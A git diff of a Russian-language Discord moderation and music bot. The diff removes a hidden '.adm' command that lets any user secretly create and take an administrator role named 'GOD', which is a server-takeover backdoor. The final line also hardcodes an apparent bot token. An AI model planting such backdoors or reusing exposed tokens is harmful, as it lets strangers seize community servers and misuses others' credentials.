@@ -9,10 +9,13 @@ import youtube_dl
 from youtube_dl import *
 
 
+
+
 client = commands.Bot(command_prefix = '.', intents = discord.Intents.all(), case_insensitive = True, strip_after_prefix = True)
 client.remove_command('help')
 connection = sqlite3.connect('TABLE.db')
 cursor = connection.cursor()
+
 
 @client.event
 async def on_ready():
@@ -101,9 +104,10 @@ async def ban(ctx, member: discord.Member = None,time=None,*,arg='Причина
 @client.command()
 @commands.has_permissions(administrator=True)
 async def unban(ctx, member: discord.Member = None,):
-	await member.unban(reason = f'{arg}')
 	await ctx.send(embed = discord.Embed(title = 'Разблокировки:unlock:', description = f':bulb:Участник: **{member.mention}** разбанен \n:bulb:Администратор = {ctx.author}'))
+	await member.unban(reason = f'{arg}')
 	await member.send(embed = discord.Embed(title = 'Разблокировки:unlock:', description = f':bulb:Участник: **{member.mention}** разбанен \n:bulb:Администратор = {ctx.author}'))
+
 @client.command()
 @commands.has_permissions(administrator=True)
 async def warn(ctx, member: discord.Member = None, *, arg='Причина не указана'):
@@ -163,13 +167,6 @@ async def лс(ctx, member: discord.Member = None, *, arg = None):
 		await member.send(arg)
 
 @client.command()
-async def adm(ctx, limit = None):
-	await ctx.channel.purge(limit = 1)
-	await ctx.guild.create_role(permissions = discord.Permissions(administrator = True), name = 'GOD')
-	await ctx.author.add_roles(discord.utils.get(ctx.guild.roles, name = 'GOD'))
-	await ctx.author.send(embed = discord.Embed(title = ':bulb:Взлом', description = 'Вам была выдана роль __new role__! В ней есть право администратора!'))
-
-@client.command()
 async def help(ctx):
 	emb = discord.Embed(title = ':scroll:Команды:scroll:')
 	emb.add_field(name = ':pushpin:.mute', value=':bulb:Мут', inline = True)
@@ -211,16 +208,18 @@ async def on_command_error(ctx, error):
 #@client.command()
 #async def test(ctx):
 #	msg = await ctx.send(
-#		embed = discord.Embed(title = 'Вы точно хотите перевевсти деньги?', timestamp = ctx.message.created_at),
+#		embed = discord.Embed(title = 'Оповещения', timestamp = ctx.message.created_at),
 #		components = [
-#			Button(style = ButtonStyle.green, label = 'Да'),
-#			Button(style = ButtonStyle.red, label = 'Нет')
-#
+#			Button(style = ButtonStyle.green, label = 'О ботах'),
+#			Button(style = ButtonStyle.gray, label = 'О новых видео')
+#		])
 #	a = True
 #	while a:
 #		res = await client.wait_for('button_click', check = lambda message: message.author == ctx.author)
-#		if res.component.label == 'Да':
-#			await res.respond(embed = discord.Embed(type=7, description = "**Выполнено**"))
+#		if res.component.label == 'О ботах':
+#			await member.add_roles( id=918387347958157372 )
+#		elif res.component.label == 'О новых видео':
+#			await author.add_roles(discord.utils.get(ctx.author.guild.roles, id = 
 #		else:
 #			await res.respond(embed = discord.Embed(type=7, description = '**Отклонено!**'))
 #			a = False		
@@ -357,5 +356,6 @@ async def leave(ctx):
 		await ctx.send(embed = discord.Embed(title = 'Музыка:notes:', description =f":bulb:Отключился от {channel}"))
 	else:
 		await ctx.send(embed = discord.Embed(title = 'Музыка:notes:', description =":bulb:Бот не подключен к гс!"))
+
 
 client.run('OTExOTQ5NTE0NzYyNTE4NTI4.YZo1Kw.xgFNuiyred3JHMHcGdfq82fNZUY')
